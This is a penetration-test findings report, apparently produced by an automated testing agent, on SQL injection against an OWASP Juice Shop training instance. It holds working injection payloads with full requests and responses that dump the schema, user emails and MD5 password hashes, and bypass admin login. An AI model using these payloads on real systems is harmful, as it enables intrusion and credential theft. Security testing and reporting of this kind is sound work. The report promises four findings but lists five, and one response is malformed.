# SQL Injection Findings Report

**Target:** http://54.146.141.88:3000 (OWASP Juice Shop)  
**Test Date:** February 22, 2026  
**Tester:** Security Testing Agent  

## Executive Summary

Four critical SQL injection vulnerabilities were confirmed through manual testing against the target OWASP Juice Shop application. These vulnerabilities enable complete database compromise including authentication bypass, data extraction, and access to sensitive user credentials.

## Findings

### Finding 1
**Vulnerability:** SQL Injection in product search (Boolean-based)
**Endpoint:** GET /rest/products/search?q=
**Severity:** CRITICAL (CVSS 9.8)
**Proof:**

**Baseline Request:**
```
GET /rest/products/search?q=nonexistentproduct HTTP/1.1
Host: 54.146.141.88:3000
```

**Baseline Response:**
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 30

{"status":"success","data":[]}
```

**Injection Request:**
```
GET /rest/products/search?q=qwert%27))%20OR%201%3D1-- HTTP/1.1
Host: 54.146.141.88:3000
```

**Injection Response:**
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 18758

{"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)",...},{"id":2,"name":"Orange Juice (1000ml)",...},...]}
```

**Evidence:** Injecting `qwert')) OR 1=1--` into the search parameter caused the application to return all products in the database (18,758 bytes of data vs 30 bytes for empty search), confirming successful boolean-based SQL injection. The payload correctly closes the LIKE statement and parentheses from the backend query.

**Payloads Attempted:**
1. `qwert')) OR 1=1--` → SUCCESS (All products returned, 18KB response)
2. `' OR 1=1--` → FAIL (SQL error: incomplete input)
3. `test' OR '1'='1` → FAIL (Empty result, incorrect syntax for query structure)

### Finding 2
**Vulnerability:** SQL Injection in product search (UNION-based with database schema extraction)
**Endpoint:** GET /rest/products/search?q=
**Severity:** CRITICAL (CVSS 9.8)
**Proof:**

**Request:**
```
GET /rest/products/search?q=qwert%27))%20UNION%20SELECT%20sql,name,%273%27,%274%27,%275%27,%276%27,%277%27,%278%27,%279%27%20FROM%20sqlite_master%20WHERE%20type=%27table%27-- HTTP/1.1
Host: 54.146.141.88:3000
```

**Response:**
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 8689

{"status":"success","data":[{"id":"CREATE TABLE `Addresses` (`UserId` INTEGER REFERENCES `Users` (`id`)...","name":"Addresses",...},{"id":"CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255) DEFAULT '', `email` VARCHAR(255) UNIQUE, `password` VARCHAR(255), `role` VARCHAR(255) DEFAULT 'customer',...","name":"Users",...}]}
```

**Evidence:** UNION injection successfully extracted the complete database schema including table structures. The response reveals 21 database tables including Users, Products, Baskets, and other sensitive tables with their complete CREATE statements. This confirms the Products table has 9 columns as expected.

**Payloads Attempted:**
1. `qwert')) UNION SELECT sql,name,'3','4','5','6','7','8','9' FROM sqlite_master WHERE type='table'--` → SUCCESS (Database schema extracted)

### Finding 3
**Vulnerability:** SQL Injection in product search (User credentials extraction)
**Endpoint:** GET /rest/products/search?q=
**Severity:** CRITICAL (CVSS 9.8)
**Proof:**

**Request:**
```
GET /rest/products/search?q=qwert%27))%20UNION%20SELECT%20id,email,password,role,%275%27,%276%27,%277%27,%278%27,%279%27%20FROM%20Users-- HTTP/1.1
Host: 54.146.141.88:3000
```

**Response:**
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 4219

{"status":"success","data":[{"id":1,"name":"admin@juice-sh.op","description":"0192023a7bbd73250516f069df18b500","price":"admin",...},{"id":2,"name":"jim@juice-sh.op","description":"e541ca7ecf72b8d1286474fc613e5e45","price":"customer",...},{"id":4,"name":"bjoern.kimminich@gmail.com","description":"6edd9d726cbdc873c539e41ae8757b8c","price":"admin",...},...]}
```

**Evidence:** UNION injection successfully extracted all 23 user records including email addresses, password hashes (MD5), and roles. Multiple admin accounts identified including `admin@juice-sh.op`, `bjoern.kimminich@gmail.com`, `support@juice-sh.op`, and others. Password hashes are MD5 format and potentially crackable.

**Critical Data Extracted:**
- 23 user accounts total
- 7 admin accounts identified
- All password hashes (MD5 format)
- User roles (admin, customer, deluxe, accounting)

**Payloads Attempted:**
1. `qwert')) UNION SELECT id,email,password,role,'5','6','7','8','9' FROM Users--` → SUCCESS (All user credentials extracted)

### Finding 4
**Vulnerability:** SQL Injection in user login (Authentication bypass)
**Endpoint:** POST /rest/user/login
**Severity:** CRITICAL (CVSS 9.8)
**Proof:**

**Baseline Request:**
```
POST /rest/user/login HTTP/1.1
Host: 54.146.141.88:3000
Content-Type: application/json

{"email":"test@example.com","password":"test"}
```

**Baseline Response:**
```
HTTP/1.1 401 Unauthorized
Content-Type: text/html; charset=utf-8
Content-Length: 26

Invalid email or password.
```

**Injection Request:**
```
POST /rest/user/login HTTP/1.1
Host: 54.146.141.88:3000
Content-Type: application/json

{"email":"' OR 1=1--","password":"x"}
```

**Injection Response:**
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 799

{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDItMjIgMDY6MTg6MTcuOTc0ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDItMjIgMDY6MTg6MTcuOTc0ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3MTc0MzkyMH0.Bfubh4giUv-4zotwCKQbhtWz2GZ5gwGp0qh2xNwPOqwGhqH0rNyuGrzBaRCpi5Zc8dQUfF9cE6lQxziAR9mWWOUnSCaPsFddOZ0IlNMr9eV-T_qS92K3GjUYwSW-Ju9Dwo3RfjxLvBqBAY9ScZn47eAVuQd_pbAwIyNwa_TImO8","bid":1,"umail":"admin@juice-sh.op"}}
```

**Evidence:** SQL injection in the email parameter successfully bypassed authentication and returned a valid JWT token for the admin user (`admin@juice-sh.op`). The response changed from 401 Unauthorized to 200 OK with a complete admin user profile and authentication token, confirming complete authentication bypass.

**Admin Token Obtained:** `eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...` (valid admin JWT)

**Payloads Attempted:**
1. `' OR 1=1--` → SUCCESS (Admin token received)
2. `admin@juice-sh.op'--` → SUCCESS (Admin token received)

### Finding 5
**Vulnerability:** SQL Injection in user login (Targeted admin bypass)
**Endpoint:** POST /rest/user/login
**Severity:** CRITICAL (CVSS 9.8)
**Proof:**

**Request:**
```
POST /rest/user/login HTTP/1.1
Host: 54.146.141.88:3000
Content-Type: application/json

{"email":"admin@juice-sh.op'--","password":"x"}
```

**Response:**
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 799

{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6{"id":1,"username":"","email":"admin@juice-sh.op","password":"0192023a7bbd73250516f069df18b500","role":"admin"...},"iat":1771743925}...","bid":1,"umail":"admin@juice-sh.op"}}
```

**Evidence:** Targeted SQL injection specifically bypassing authentication for the admin account by commenting out the password check. This demonstrates precise control over the authentication bypass, allowing an attacker to log in as any specific user without knowing their password.

**Payloads Attempted:**
1. `admin@juice-sh.op'--` → SUCCESS (Targeted admin bypass)

## Technical Analysis

### Root Cause
All vulnerabilities stem from direct SQL concatenation in the backend code without parameterized queries:

1. **Search endpoint** (`routes/search.ts:23`): `"SELECT * FROM Products WHERE ((name LIKE '%" + criteria + "%' OR description LIKE '%" + criteria + "%') AND deletedAt IS NULL) ORDER BY name"`
2. **Login endpoint** (`routes/login.ts:34`): `"SELECT * FROM Users WHERE email = '" + req.body.email + "' AND password = '" + security.hash(req.body.password) + "' AND deletedAt IS NULL"`

### Attack Vectors Confirmed
- **Boolean-based blind SQL injection** in search parameter
- **UNION-based injection** for data extraction
- **Authentication bypass** via login parameter injection
- **Complete database schema enumeration**
- **Sensitive data extraction** (user credentials, password hashes)

### Impact Assessment
- **Complete authentication bypass** - Administrative access without credentials
- **Full database disclosure** - All user data, credentials, and system information extracted
- **Privilege escalation** - Customer accounts can become admin through token manipulation
- **Data confidentiality breach** - All sensitive user information compromised

## Recommendations

### Immediate Actions
1. **Implement parameterized queries** for all database operations
2. **Apply input validation** and sanitization on all user inputs
3. **Use prepared statements** instead of string concatenation
4. **Implement proper error handling** to prevent information disclosure

### Long-term Mitigations
1. **Web Application Firewall (WAF)** implementation
2. **Database activity monitoring**
3. **Regular security testing** and code reviews
4. **Principle of least privilege** for database connections
5. **Security training** for development team

## Conclusion

The OWASP Juice Shop application is severely vulnerable to SQL injection attacks across multiple endpoints. The vulnerabilities allow complete compromise of the application and all user data. Immediate remediation is required to prevent unauthorized access and data theft.